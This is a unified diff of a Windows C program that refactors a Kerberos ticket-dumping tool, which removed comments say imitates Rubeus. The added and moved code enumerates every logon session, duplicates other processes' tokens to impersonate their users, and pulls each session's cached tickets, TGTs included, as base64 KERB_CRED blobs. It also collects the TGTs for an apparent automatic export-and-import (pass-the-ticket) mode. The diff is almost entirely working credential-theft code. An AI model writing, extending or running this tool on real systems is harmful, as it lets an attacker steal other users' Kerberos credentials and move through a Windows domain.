@@ -1,4 +1,4 @@
-﻿#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <ntsecapi.h>
 #include <sddl.h>
@@ -100,7 +100,6 @@ void PrintBase64(const char* base64_string) {
 void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain, const wchar_t* serviceName) {
     if (g_tgtCount >= MAX_TGTS) return;
 
-    // Verificar si ya existe un TGT para este LogonId
     for (ULONG i = 0; i < g_tgtCount; i++) {
         if (g_tgtList[i].logonId == logonId &&
             wcscmp(g_tgtList[i].serviceName, serviceName) == 0) {
@@ -201,6 +200,346 @@ void EnumerateLogonSessions() {
     FreeLibrary(h);
 }
 
+BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return FALSE;
+    }
+
+    do {
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) continue;
+
+        HANDLE hToken;
+        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+            TOKEN_STATISTICS stats;
+            DWORD len;
+            if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len)) {
+                if (stats.AuthenticationId.LowPart == targetLogonId) {
+                    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                        SecurityImpersonation, TokenImpersonation, hImpToken)) {
+                        CloseHandle(hToken);
+                        CloseHandle(hProcess);
+                        CloseHandle(hSnapshot);
+                        return TRUE;
+                    }
+                }
+            }
+            CloseHandle(hToken);
+        }
+        CloseHandle(hProcess);
+    } while (Process32Next(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return FALSE;
+}
+
+void PrintSessionInfo(PSECURITY_LOGON_SESSION_DATA session_data, ULONG logonIdLow) {
+    wchar_t usr[256] = { 0 }, dom[256] = { 0 }, auth_pkg[256] = { 0 }, sid_str[256] = { 0 };
+
+    if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
+        size_t len = session_data->UserName.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(usr, session_data->UserName.Buffer, len);
+        usr[len] = L'\0';
+    }
+
+    if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
+        size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(dom, session_data->LogonDomain.Buffer, len);
+        dom[len] = L'\0';
+    }
+
+    if (session_data->AuthenticationPackage.Buffer && session_data->AuthenticationPackage.Length > 0) {
+        size_t len = session_data->AuthenticationPackage.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(auth_pkg, session_data->AuthenticationPackage.Buffer, len);
+        auth_pkg[len] = L'\0';
+    }
+
+    if (session_data->Sid) {
+        LPWSTR sidString = NULL;
+        if (ConvertSidToStringSidW(session_data->Sid, &sidString)) {
+            wcsncpy(sid_str, sidString, 255);
+            LocalFree(sidString);
+        }
+    }
+
+    printf("  UserName                 : %ls\n", wcslen(usr) ? usr : L"(null)");
+    printf("  Domain                   : %ls\n", wcslen(dom) ? dom : L"(null)");
+    printf("  LogonId                  : 0x%lx\n", (unsigned long)logonIdLow);
+    printf("  UserSID                  : %ls\n", wcslen(sid_str) ? sid_str : L"(null)");
+    printf("  AuthenticationPackage    : %ls\n", wcslen(auth_pkg) ? auth_pkg : L"(null)");
+    printf("  LogonType                : %ls\n", GetLogonTypeString(session_data->LogonType));
+
+    SYSTEMTIME stm;
+    FILETIME ft;
+    ft.dwLowDateTime = session_data->LogonTime.LowPart;
+    ft.dwHighDateTime = session_data->LogonTime.HighPart;
+    FileTimeToSystemTime(&ft, &stm);
+    printf("  LogonTime                : %02d/%02d/%04d %02d:%02d:%02d\n",
+        stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+    printf("  LogonServer              : ");
+    if (session_data->LogonServer.Buffer && session_data->LogonServer.Length > 0) {
+        wprintf(L"%ls\n", session_data->LogonServer.Buffer);
+    }
+    else {
+        printf("\n");
+    }
+
+    printf("  LogonServerDNSDomain     : ");
+    if (session_data->DnsDomainName.Buffer && session_data->DnsDomainName.Length > 0) {
+        wprintf(L"%ls\n", session_data->DnsDomainName.Buffer);
+    }
+    else {
+        printf("\n");
+    }
+
+    printf("  UserPrincipalName        : ");
+    if (session_data->Upn.Buffer && session_data->Upn.Length > 0) {
+        wprintf(L"%ls\n", session_data->Upn.Buffer);
+    }
+    else {
+        printf("\n");
+    }
+
+    printf("\n");
+}
+
+void PrintTicketDetails(KERB_TICKET_CACHE_INFO* t, const wchar_t* userName, const wchar_t* domain, 
+                       HANDLE lsa, ULONG auth, ULONG sessionLogonId,
+                       PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn) {
+    wchar_t srv[512] = { 0 }, rlm[256] = { 0 };
+
+    if (t->ServerName.Buffer && t->ServerName.Length > 0) {
+        size_t len = t->ServerName.Length / sizeof(WCHAR);
+        if (len > 511) len = 511;
+        wcsncpy(srv, t->ServerName.Buffer, len);
+        srv[len] = L'\0';
+    }
+
+    if (t->RealmName.Buffer && t->RealmName.Length > 0) {
+        size_t len = t->RealmName.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(rlm, t->RealmName.Buffer, len);
+        rlm[len] = L'\0';
+    }
+
+    BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
+    const wchar_t* ticket_type = is_tgt ? L"Ticket Granting Ticket (TGT)" : L"Service Ticket";
+
+    printf("\n");
+    printf("    TicketType               :  %ls\n", ticket_type);
+    printf("    ServiceName              :  %ls\n", srv);
+    printf("    ServiceRealm             :  %ls\n", rlm);
+    printf("    UserName                 :  %ls\n", wcslen(userName) ? userName : L"(unknown)");
+    printf("    UserRealm                :  %ls\n", rlm);
+
+    SYSTEMTIME stm;
+    FILETIME ft_start, ft_end, ft_renew;
+    ft_start.dwLowDateTime = t->StartTime.LowPart;
+    ft_start.dwHighDateTime = t->StartTime.HighPart;
+    ft_end.dwLowDateTime = t->EndTime.LowPart;
+    ft_end.dwHighDateTime = t->EndTime.HighPart;
+    ft_renew.dwLowDateTime = t->RenewTime.LowPart;
+    ft_renew.dwHighDateTime = t->RenewTime.HighPart;
+
+    FileTimeToSystemTime(&ft_start, &stm);
+    printf("    StartTime                :  %02d/%02d/%04d %02d:%02d:%02d\n",
+        stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+    FileTimeToSystemTime(&ft_end, &stm);
+    printf("    EndTime                  :  %02d/%02d/%04d %02d:%02d:%02d\n",
+        stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+    FileTimeToSystemTime(&ft_renew, &stm);
+    printf("    RenewTill                :  %02d/%02d/%04d %02d:%02d:%02d\n",
+        stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+    printf("    Flags                    :  ");
+    BOOL first = TRUE;
+    if (t->TicketFlags & 0x40000000) { printf("forwardable"); first = FALSE; }
+    if (t->TicketFlags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
+    if (t->TicketFlags & 0x00400000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
+    if (t->TicketFlags & 0x00200000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
+    if (t->TicketFlags & 0x20000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
+    if (t->TicketFlags & 0x00000001) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
+    if (t->TicketFlags & 0x00010000) { if (!first) printf(", "); printf("name_canonicalize"); }
+    printf("\n");
+
+    printf("    KeyType                  :  %s\n", GetEncryptionTypeName(t->EncryptionType));
+    printf("    Base64(key)              :  (not available)\n");
+
+    HANDLE hImpToken2 = NULL;
+    BOOL needRevert2 = FALSE;
+
+    if (ImpersonateSession(sessionLogonId, &hImpToken2)) {
+        if (ImpersonateLoggedOnUser(hImpToken2)) {
+            needRevert2 = TRUE;
+        }
+    }
+
+    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(srv) * sizeof(WCHAR)));
+    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
+
+    if (retReq) {
+        ZeroMemory(retReq, reqSize);
+        retReq->MessageType = KerbRetrieveEncodedTicketMessage;
+        retReq->LogonId.LowPart = 0;
+        retReq->LogonId.HighPart = 0;
+        retReq->TicketFlags = 0;
+        retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+        retReq->EncryptionType = 0;
+        retReq->TargetName.Length = (USHORT)(wcslen(srv) * sizeof(WCHAR));
+        retReq->TargetName.MaximumLength = retReq->TargetName.Length;
+        retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
+        memcpy(retReq->TargetName.Buffer, srv, retReq->TargetName.Length);
+
+        PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
+        ULONG retSz = 0;
+        NTSTATUS retSub = 0;
+
+        NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &retSub);
+
+        if (retStatus == 0 && retSub == 0 && retRsp) {
+            char* base64_ticket = Base64Encode(
+                retRsp->Ticket.EncodedTicket,
+                retRsp->Ticket.EncodedTicketSize
+            );
+
+            printf("    Base64EncodedTicket   :\n");
+            if (base64_ticket) {
+                PrintBase64(base64_ticket);
+                free(base64_ticket);
+            }
+            else {
+                printf("      (failed to encode)\n");
+            }
+
+            fre_fn(retRsp);
+        }
+        else {
+            printf("    Base64EncodedTicket   :\n");
+            printf("      (failed to retrieve - Status=0x%08lX, SubStatus=0x%08lX)\n",
+                (unsigned long)retStatus, (unsigned long)retSub);
+        }
+
+        free(retReq);
+    }
+    else {
+        printf("    Base64EncodedTicket   :\n");
+        printf("      (memory allocation failed)\n");
+    }
+
+    if (needRevert2) {
+        RevertToSelf();
+        CloseHandle(hImpToken2);
+    }
+}
+
+void EnumerateTicketsForSession(HANDLE lsa, ULONG auth, LUID sessionLuid, PSECURITY_LOGON_SESSION_DATA session_data,
+                               PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn,
+                               BOOL collectTGTs, ULONG* total_tickets, ULONG* total_tgts) {
+    
+    wchar_t usr[256] = { 0 }, dom[256] = { 0 };
+
+    if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
+        size_t len = session_data->UserName.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(usr, session_data->UserName.Buffer, len);
+        usr[len] = L'\0';
+    }
+
+    if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
+        size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
+        if (len > 255) len = 255;
+        wcsncpy(dom, session_data->LogonDomain.Buffer, len);
+        dom[len] = L'\0';
+    }
+
+    PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
+    ULONG sz = 0;
+    NTSTATUS sub = 0;
+    NTSTATUS status = -1;
+
+    HANDLE hImpToken = NULL;
+    BOOL needRevert = FALSE;
+
+    if (ImpersonateSession(sessionLuid.LowPart, &hImpToken)) {
+        if (ImpersonateLoggedOnUser(hImpToken)) {
+            needRevert = TRUE;
+
+            KERB_QUERY_TKT_CACHE_REQUEST req;
+            req.MessageType = KerbQueryTicketCacheMessage;
+            req.LogonId.LowPart = 0;
+            req.LogonId.HighPart = 0;
+
+            status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+
+            RevertToSelf();
+            CloseHandle(hImpToken);
+
+            if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
+                if (rsp) {
+                    fre_fn(rsp);
+                    rsp = NULL;
+                }
+            }
+        }
+        else {
+            CloseHandle(hImpToken);
+        }
+    }
+
+    if (!rsp) {
+        KERB_QUERY_TKT_CACHE_REQUEST req;
+        req.MessageType = KerbQueryTicketCacheMessage;
+        req.LogonId.LowPart = sessionLuid.LowPart;
+        req.LogonId.HighPart = sessionLuid.HighPart;
+
+        status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+    }
+
+    if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
+        if (rsp) fre_fn(rsp);
+        return;
+    }
+
+    PrintSessionInfo(session_data, sessionLuid.LowPart);
+
+    for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
+        KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
+        wchar_t srv[512] = { 0 };
+
+        if (t->ServerName.Buffer && t->ServerName.Length > 0) {
+            size_t len = t->ServerName.Length / sizeof(WCHAR);
+            if (len > 511) len = 511;
+            wcsncpy(srv, t->ServerName.Buffer, len);
+            srv[len] = L'\0';
+        }
+
+        BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
+        if (is_tgt && collectTGTs) {
+            (*total_tgts)++;
+            AddTGTToList(sessionLuid.LowPart, usr, dom, srv);
+        }
+
+        PrintTicketDetails(t, usr, dom, lsa, auth, sessionLuid.LowPart, cal_fn, fre_fn);
+        (*total_tickets)++;
+    }
+
+    fre_fn(rsp);
+    printf("\n");
+}
+
 void EnumerateMyTickets() {
     HMODULE h = LoadLibraryA("secur32.dll");
     PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
@@ -282,46 +621,6 @@ void EnumerateMyTickets() {
     FreeLibrary(h);
 }
 
-BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
-
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
-
-    if (!Process32First(hSnapshot, &pe32)) {
-        CloseHandle(hSnapshot);
-        return FALSE;
-    }
-
-    do {
-        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
-        if (!hProcess) continue;
-
-        HANDLE hToken;
-        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
-            TOKEN_STATISTICS stats;
-            DWORD len;
-            if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len)) {
-                if (stats.AuthenticationId.LowPart == targetLogonId) {
-                    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
-                        SecurityImpersonation, TokenImpersonation, hImpToken)) {
-                        CloseHandle(hToken);
-                        CloseHandle(hProcess);
-                        CloseHandle(hSnapshot);
-                        return TRUE;
-                    }
-                }
-            }
-            CloseHandle(hToken);
-        }
-        CloseHandle(hProcess);
-    } while (Process32Next(hSnapshot, &pe32));
-
-    CloseHandle(hSnapshot);
-    return FALSE;
-}
-
 void EnumerateAllTickets() {
     PrintDebug("Enumerating tickets from ALL sessions on the machine...");
 
@@ -399,319 +698,13 @@ void EnumerateAllTickets() {
         PSECURITY_LOGON_SESSION_DATA session_data = NULL;
         if (get_fn(&session_list[i], &session_data) != 0 || !session_data) continue;
 
-        wchar_t usr[256] = { 0 }, dom[256] = { 0 }, auth_pkg[256] = { 0 };
-        wchar_t sid_str[256] = { 0 };
-
-        if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
-            size_t len = session_data->UserName.Length / sizeof(WCHAR);
-            if (len > 255) len = 255;
-            wcsncpy(usr, session_data->UserName.Buffer, len);
-            usr[len] = L'\0';
+        ULONG tickets_before = total_tickets;
+        EnumerateTicketsForSession(lsa, auth, session_list[i], session_data, cal_fn, fre_fn, TRUE, &total_tickets, &total_tgts);
+        
+        if (total_tickets > tickets_before) {
+            total_sessions_with_tickets++;
         }
 
-        if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
-            size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
-            if (len > 255) len = 255;
-            wcsncpy(dom, session_data->LogonDomain.Buffer, len);
-            dom[len] = L'\0';
-        }
-
-        if (session_data->AuthenticationPackage.Buffer && session_data->AuthenticationPackage.Length > 0) {
-            size_t len = session_data->AuthenticationPackage.Length / sizeof(WCHAR);
-            if (len > 255) len = 255;
-            wcsncpy(auth_pkg, session_data->AuthenticationPackage.Buffer, len);
-            auth_pkg[len] = L'\0';
-        }
-
-        if (session_data->Sid) {
-            LPWSTR sidString = NULL;
-            if (ConvertSidToStringSidW(session_data->Sid, &sidString)) {
-                wcsncpy(sid_str, sidString, 255);
-                LocalFree(sidString);
-            }
-        }
-
-        // ============================================================================
-        // CORRECCIÓN #1: NO FILTRAR POR PAQUETE DE AUTENTICACIÓN
-        // Rubeus consulta TODAS las sesiones, no solo las que son "Kerberos"
-        // ============================================================================
-
-        printf("[DEBUG] Processing session 0x%lx [%ls\\%ls] (Package: %ls)\n",
-            (unsigned long)session_list[i].LowPart,
-            wcslen(dom) ? dom : L"?",
-            wcslen(usr) ? usr : L"?",
-            wcslen(auth_pkg) ? auth_pkg : L"?");
-
-        // ============================================================================
-        // CORRECCIÓN #2: INTENTAR DOS MÉTODOS (como Rubeus)
-        // Método 1: Impersonar y usar LogonId = 0
-        // Método 2: No impersonar y usar LogonId específico
-        // ============================================================================
-
-        PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
-        ULONG sz = 0;
-        NTSTATUS sub = 0;
-        NTSTATUS status = -1;
-        BOOL used_impersonation = FALSE;
-
-        // ========== MÉTODO 1: CON IMPERSONACIÓN ==========
-        HANDLE hImpToken = NULL;
-        BOOL needRevert = FALSE;
-
-        if (ImpersonateSession(session_list[i].LowPart, &hImpToken)) {
-            if (ImpersonateLoggedOnUser(hImpToken)) {
-                needRevert = TRUE;
-                used_impersonation = TRUE;
-
-                KERB_QUERY_TKT_CACHE_REQUEST req;
-                req.MessageType = KerbQueryTicketCacheMessage;
-                req.LogonId.LowPart = 0;  // Usar 0 cuando estás impersonado
-                req.LogonId.HighPart = 0;
-
-                status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
-
-                RevertToSelf();
-                CloseHandle(hImpToken);
-
-                if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
-                    printf("[DEBUG] ✓ Method 1 (impersonation) successful - Found %lu tickets\n",
-                        (unsigned long)rsp->CountOfTickets);
-                }
-                else {
-                    printf("[DEBUG] → Method 1 (impersonation) failed or no tickets (Status: 0x%08lX, Sub: 0x%08lX)\n",
-                        (unsigned long)status, (unsigned long)sub);
-                    if (rsp) {
-                        fre_fn(rsp);
-                        rsp = NULL;
-                    }
-                    used_impersonation = FALSE;
-                }
-            }
-            else {
-                CloseHandle(hImpToken);
-            }
-        }
-
-        // ========== MÉTODO 2: SIN IMPERSONACIÓN (si método 1 falló) ==========
-        if (!used_impersonation || !rsp) {
-            KERB_QUERY_TKT_CACHE_REQUEST req;
-            req.MessageType = KerbQueryTicketCacheMessage;
-            req.LogonId.LowPart = session_list[i].LowPart;  // Usar LogonId real
-            req.LogonId.HighPart = session_list[i].HighPart;
-
-            status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
-
-            if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
-                printf("[DEBUG] ✓ Method 2 (direct query) successful - Found %lu tickets\n",
-                    (unsigned long)rsp->CountOfTickets);
-            }
-            else {
-                printf("[DEBUG] → Method 2 (direct query) failed or no tickets (Status: 0x%08lX, Sub: 0x%08lX)\n",
-                    (unsigned long)status, (unsigned long)sub);
-            }
-        }
-
-        // Si no obtuvimos tickets, continuar con la siguiente sesión
-        if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
-            if (rsp) fre_fn(rsp);
-            fre_fn(session_data);
-            continue;
-        }
-
-        // ============================================================================
-        // IMPRIMIR INFORMACIÓN DE LA SESIÓN
-        // ============================================================================
-
-        printf("  UserName                 : %ls\n", wcslen(usr) ? usr : L"(null)");
-        printf("  Domain                   : %ls\n", wcslen(dom) ? dom : L"(null)");
-        printf("  LogonId                  : 0x%lx\n", (unsigned long)session_list[i].LowPart);
-        printf("  UserSID                  : %ls\n", wcslen(sid_str) ? sid_str : L"(null)");
-        printf("  AuthenticationPackage    : %ls\n", wcslen(auth_pkg) ? auth_pkg : L"(null)");
-        printf("  LogonType                : %ls\n", GetLogonTypeString(session_data->LogonType));
-
-        SYSTEMTIME stm;
-        FILETIME ft;
-        ft.dwLowDateTime = session_data->LogonTime.LowPart;
-        ft.dwHighDateTime = session_data->LogonTime.HighPart;
-        FileTimeToSystemTime(&ft, &stm);
-        printf("  LogonTime                : %02d/%02d/%04d %02d:%02d:%02d\n",
-            stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-        printf("  LogonServer              : ");
-        if (session_data->LogonServer.Buffer && session_data->LogonServer.Length > 0) {
-            wprintf(L"%ls\n", session_data->LogonServer.Buffer);
-        }
-        else {
-            printf("\n");
-        }
-
-        printf("  LogonServerDNSDomain     : ");
-        if (session_data->DnsDomainName.Buffer && session_data->DnsDomainName.Length > 0) {
-            wprintf(L"%ls\n", session_data->DnsDomainName.Buffer);
-        }
-        else {
-            printf("\n");
-        }
-
-        printf("  UserPrincipalName        : ");
-        if (session_data->Upn.Buffer && session_data->Upn.Length > 0) {
-            wprintf(L"%ls\n", session_data->Upn.Buffer);
-        }
-        else {
-            printf("\n");
-        }
-
-        total_sessions_with_tickets++;
-        printf("\n");
-
-        // ============================================================================
-        // ENUMERAR TODOS LOS TICKETS (TGTs Y SERVICE TICKETS)
-        // ============================================================================
-
-        for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
-            KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
-            wchar_t srv[512] = { 0 }, rlm[256] = { 0 };
-
-            if (t->ServerName.Buffer && t->ServerName.Length > 0) {
-                size_t len = t->ServerName.Length / sizeof(WCHAR);
-                if (len > 511) len = 511;
-                wcsncpy(srv, t->ServerName.Buffer, len);
-                srv[len] = L'\0';
-            }
-
-            if (t->RealmName.Buffer && t->RealmName.Length > 0) {
-                size_t len = t->RealmName.Length / sizeof(WCHAR);
-                if (len > 255) len = 255;
-                wcsncpy(rlm, t->RealmName.Buffer, len);
-                rlm[len] = L'\0';
-            }
-
-            BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
-            if (is_tgt) {
-                total_tgts++;
-                AddTGTToList(session_list[i].LowPart, usr, dom, srv);
-            }
-
-            const wchar_t* ticket_type = L"Service Ticket";
-            if (is_tgt) {
-                ticket_type = L"Ticket Granting Ticket (TGT)";
-            }
-
-            printf("\n");
-            printf("    TicketType               :  %ls\n", ticket_type);
-            printf("    ServiceName              :  %ls\n", srv);
-            printf("    ServiceRealm             :  %ls\n", rlm);
-            printf("    UserName                 :  %ls\n", wcslen(usr) ? usr : L"(unknown)");
-            printf("    UserRealm                :  %ls\n", rlm);
-
-            FILETIME ft_start, ft_end, ft_renew;
-            ft_start.dwLowDateTime = t->StartTime.LowPart;
-            ft_start.dwHighDateTime = t->StartTime.HighPart;
-            ft_end.dwLowDateTime = t->EndTime.LowPart;
-            ft_end.dwHighDateTime = t->EndTime.HighPart;
-            ft_renew.dwLowDateTime = t->RenewTime.LowPart;
-            ft_renew.dwHighDateTime = t->RenewTime.HighPart;
-
-            FileTimeToSystemTime(&ft_start, &stm);
-            printf("    StartTime                :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-            FileTimeToSystemTime(&ft_end, &stm);
-            printf("    EndTime                  :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-            FileTimeToSystemTime(&ft_renew, &stm);
-            printf("    RenewTill                :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-            printf("    Flags                    :  ");
-            BOOL first = TRUE;
-            if (t->TicketFlags & 0x40000000) { printf("forwardable"); first = FALSE; }
-            if (t->TicketFlags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
-            if (t->TicketFlags & 0x00400000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
-            if (t->TicketFlags & 0x00200000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
-            if (t->TicketFlags & 0x20000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
-            if (t->TicketFlags & 0x00000001) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
-            if (t->TicketFlags & 0x00010000) { if (!first) printf(", "); printf("name_canonicalize"); }
-            printf("\n");
-
-            printf("    KeyType                  :  %s\n", GetEncryptionTypeName(t->EncryptionType));
-            printf("    Base64(key)              :  (not available)\n");
-
-            // ============================================================================
-            // RETRIEVE: Impersonar de nuevo para obtener el ticket completo
-            // ============================================================================
-            HANDLE hImpToken2 = NULL;
-            BOOL needRevert2 = FALSE;
-
-            if (ImpersonateSession(session_list[i].LowPart, &hImpToken2)) {
-                if (ImpersonateLoggedOnUser(hImpToken2)) {
-                    needRevert2 = TRUE;
-                }
-            }
-
-            ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(srv) * sizeof(WCHAR)));
-            PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
-
-            if (retReq) {
-                ZeroMemory(retReq, reqSize);
-                retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-                retReq->LogonId.LowPart = 0;
-                retReq->LogonId.HighPart = 0;
-                retReq->TicketFlags = 0;
-                retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
-                retReq->EncryptionType = 0;
-                retReq->TargetName.Length = (USHORT)(wcslen(srv) * sizeof(WCHAR));
-                retReq->TargetName.MaximumLength = retReq->TargetName.Length;
-                retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-                memcpy(retReq->TargetName.Buffer, srv, retReq->TargetName.Length);
-
-                PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
-                ULONG retSz = 0;
-                NTSTATUS retSub = 0;
-
-                NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &retSub);
-
-                if (retStatus == 0 && retSub == 0 && retRsp) {
-                    char* base64_ticket = Base64Encode(
-                        retRsp->Ticket.EncodedTicket,
-                        retRsp->Ticket.EncodedTicketSize
-                    );
-
-                    printf("    Base64EncodedTicket   :\n");
-                    if (base64_ticket) {
-                        PrintBase64(base64_ticket);
-                        free(base64_ticket);
-                    }
-                    else {
-                        printf("      (failed to encode)\n");
-                    }
-
-                    fre_fn(retRsp);
-                }
-                else {
-                    printf("    Base64EncodedTicket   :\n");
-                    printf("      (failed to retrieve - Status=0x%08lX, SubStatus=0x%08lX)\n",
-                        (unsigned long)retStatus, (unsigned long)retSub);
-                }
-
-                free(retReq);
-            }
-            else {
-                printf("    Base64EncodedTicket   :\n");
-                printf("      (memory allocation failed)\n");
-            }
-
-            if (needRevert2) {
-                RevertToSelf();
-                CloseHandle(hImpToken2);
-            }
-
-            total_tickets++;
-        }
-
-        fre_fn(rsp);
-        printf("\n");
         fre_fn(session_data);
     }
 
@@ -1006,7 +999,6 @@ void ExportTicket(const char* logonIdStr) {
     FreeLibrary(h);
 }
 
-
 void AutoExportAndImport() {
     PrintDebug("Auto mode: Enumerating tickets and importing selected TGT...");
 
@@ -1043,6 +1035,8 @@ void AutoExportAndImport() {
         return;
     }
 
+    printf("Found %lu logon sessions\n\n", (unsigned long)session_cnt);
+
     HANDLE lsa = NULL;
     if (con_fn(&lsa) != 0) {
         PrintError("LsaConnectUntrusted failed");
@@ -1066,75 +1060,31 @@ void AutoExportAndImport() {
         return;
     }
 
-    printf("[DEBUG] Scanning %lu sessions for TGTs...\n", (unsigned long)session_cnt);
+    ULONG total_sessions_with_tickets = 0;
+    ULONG total_tickets = 0;
+    ULONG total_tgts = 0;
 
     for (ULONG i = 0; i < session_cnt; i++) {
         PSECURITY_LOGON_SESSION_DATA session_data = NULL;
         if (get_fn(&session_list[i], &session_data) != 0 || !session_data) continue;
 
-        wchar_t usr[256] = { 0 }, dom[256] = { 0 };
-
-        if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
-            size_t len = session_data->UserName.Length / sizeof(WCHAR);
-            if (len > 255) len = 255;
-            wcsncpy(usr, session_data->UserName.Buffer, len);
-            usr[len] = L'\0';
-        }
-
-        if (session_data->LogonDomain.Buffer && session_data->LogonDomain.Length > 0) {
-            size_t len = session_data->LogonDomain.Length / sizeof(WCHAR);
-            if (len > 255) len = 255;
-            wcsncpy(dom, session_data->LogonDomain.Buffer, len);
-            dom[len] = L'\0';
-        }
-
